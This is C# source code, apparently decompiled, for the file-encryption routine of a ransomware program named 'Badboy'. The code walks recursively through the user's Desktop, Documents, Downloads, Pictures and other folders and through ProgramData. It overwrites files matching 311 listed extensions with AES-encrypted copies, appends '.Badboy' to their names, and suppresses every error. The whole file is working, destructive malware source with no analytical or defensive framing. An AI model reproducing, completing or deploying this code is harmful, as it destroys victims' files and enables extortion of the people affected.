using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.VisualBasic;

namespace Badboymnb;

internal static class Main
{
	private static readonly string Root = Environment.GetFolderPath(Environment.SpecialFolder.System);

	private static readonly string SystemDisk = Path.GetPathRoot(Root);

	public static readonly string DesktopDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	private static readonly string MyComputerDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);

	private static readonly string DesktopDirectoryDirectory = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static readonly string FavoritesDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);

	private static readonly string MyDocumentspDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static readonly string MyMusicDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);

	private static readonly string HistoryDirectory = Environment.GetFolderPath(Environment.SpecialFolder.History);

	private static readonly string PersonalDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static readonly string DownloadsDirectory = Interaction.Environ("USERPROFILE") + "\\Downloads";

	private static readonly string DocumentsDirectory = Interaction.Environ("USERPROFILE") + "\\Documents";

	private static readonly string PicturesDirectory = Interaction.Environ("USERPROFILE") + "\\Pictures";

	private static readonly string VideosDirectory = Interaction.Environ("USERPROFILE") + "\\Videos";

	private static readonly string MusicDirectory = Interaction.Environ("USERPROFILE") + "\\Music";

	private static readonly string UserProfile = Interaction.Environ("USERPROFILE");

	public static string[] ValidExtension = new string[311]
	{
		".exe", ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".sxw",
		".stw", ".3ds", ".max", ".3dm", ".ods", ".sxc", ".stc", ".dif", ".slk", ".wb2",
		".odp", ".sxd", ".std", ".sxm", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".dbf",
		".odb", ".mdf", ".ldf", ".cpp", ".pas", ".asm", ".cmd", ".bat", ".vbs", ".sch",
		".jsp", ".php", ".asp", ".java", ".jar", ".class", ".mp3", ".wav", ".swf", ".fla",
		".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".mkv", ".flv",
		".wma", ".mid", ".m3u", ".m4u", ".svg", ".psd", ".tiff", ".tif", ".raw", ".gif",
		".png", ".bmp", ".jpg", ".jpeg", ".iso", ".backup", ".zip", ".rar", ".tgz", ".tar",
		".bak", ".ARC", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".dwg", ".pdf",
		".wk1", ".wks", ".rtf", ".csv", ".txt", ".msg", ".pst", ".ppsx", ".ppsm", ".pps",
		".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw",
		".xlsb", ".xlsm", ".xlsx", ".xls", ".dotm", ".dot", ".docm", ".docx", ".doc", ".ndf",
		".pdf", ".ib", ".ibk", ".bkp", ".dll", "pdb", ".dat", ".File", ".ini", ".bin",
		".PC", "loli", ".sys", ".log", ".xml", ".vir", ".prx", ".ds", ".mui", ".amx",
		".aep", ".csproj", ".sln", ".cs", ".ico", ".license", ".vb", ".resx", ".vbproj", ".settings",
		".asset", ".json", ".db", ".md", ".ios", ".app", ".xaml", ".snk", ".appxmanifest", ".asax",
		".html", ".index", ".config", ".cshtml", ".js", ".map", ".ttf", ".css", ".aspx", ".Master",
		".nff", ".save", ".vdproj", ".info", ".nfo", ".flp", ".suo", ".rec", ".studioonemacro", "mid",
		".nvram", ".vmsd", ".vmx", ".vmxf", ".wav", ".bbc", ".cat", ".daa", ".cue", ".nrg",
		".img", ".mds", ".ashdisc", ".bwi", ".b5i", ".gi", ".cdi", ".pdi", ".p01", ".pxi",
		".ncd", ".c2d", ".cif", ".lcd", ".fcd", ".vcd", ".dmg", ".bif", ".uif", ".isz",
		".wim", ".ima", ".package", ".langpack", ".cfg", ".data", ".PNF", ".inf", ".xsd", ".cab",
		".dmp", ".theme", ".jnt", ".msc", ".cd", ".user", ".manifest", ".application", ".deploy", ".c",
		".h", ".filters", ".vcxproj", ".sqlproj", ".cache", ".dacpac", ".pdb", ".pub", ".mpp", ".ssk",
		".wtv", ".SFX", ".chm", ".lst", ".ion", ".Targets", ".lng", ".ulf", ".xsl", ".tmp",
		".lock", ".inc.php", ".lib", ".pm", ".frm", ".hlp", ".it", ".inc", ".b4a", ".bas",
		".scss", ".nsi", ".cgi", ".var", ".ax", ".pck", ".bik", ".qtr", ".vfs0", ".vfx",
		".webm", ".webcam", ".rpkg", ".xpi", ".rc", ".spr", ".res", ".tga", ".video", ".mdl",
		".lmp", ".sc", ".lua", ".md5", ".vst", ".awk", ".nki", ".reg", ".7z", ".ace",
		".arj", ".bz2", ".cab", ".gz", ".jar", ".lz", ".lzh", ".tar", ".uue", ".xz",
		".db", ".dbs", ".dll", ".z", ".ogg", ".apk", ".md", ".dewar", ".rst", ".plist",
		".tmSnippet"
	};

	public static string Key { get; } = KeyGenerator.GetUniqueKey(133);


	private static string[] Folder { get; set; }

	private static string[] Files { get; set; }

	private static string ProgramData { get; } = SystemDisk + "\\ProgramData";


	public static void RunEncrypt()
	{
		Encryption.Run();
		List<string> list = new List<string>
		{
			DesktopDirectory,
			MyComputerDirectory,
			DesktopDirectoryDirectory,
			MyDocumentspDirectory,
			MyMusicDirectory,
			HistoryDirectory,
			PersonalDirectory,
			DownloadsDirectory,
			DocumentsDirectory,
			PicturesDirectory,
			VideosDirectory,
			MusicDirectory,
			UserProfile,
			FavoritesDirectory,
			ProgramData,
			SystemDisk + "\\Users\\"
		};
		foreach (string item in list)
		{
			SearchFolder(item);
			SearchFile(item);
		}
	}

	internal static void SearchDisk()
	{
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			if (text != SystemDisk)
			{
				SearchFolder(text);
			}
			else
			{
				SearchFile(text);
			}
			SearchFile(text);
		}
	}

	internal static void SearchFolder(string name)
	{
		try
		{
			Folder = Directory.GetDirectories(name, "*", SearchOption.TopDirectoryOnly);
		}
		catch (Exception)
		{
			return;
		}
		string[] folder = Folder;
		foreach (string name2 in folder)
		{
			SearchFile(name2);
			SearchFolder(name2);
		}
	}

	internal static void SearchFile(string name)
	{
		string[] validExtension = ValidExtension;
		foreach (string text in validExtension)
		{
			try
			{
				Files = Directory.GetFiles(name, "*" + text, SearchOption.TopDirectoryOnly);
			}
			catch (Exception)
			{
				break;
			}
			string[] files = Files;
			foreach (string name2 in files)
			{
				Encrypt(name2);
			}
		}
	}

	internal static void Encrypt(string name)
	{
		try
		{
			byte[] bytes = Encryption.AesEncrypt(File.ReadAllBytes(name), Key);
			File.WriteAllBytes(name, bytes);
			File.Move(name, name + ".Badboy");
		}
		catch (Exception)
		{
		}
	}
}
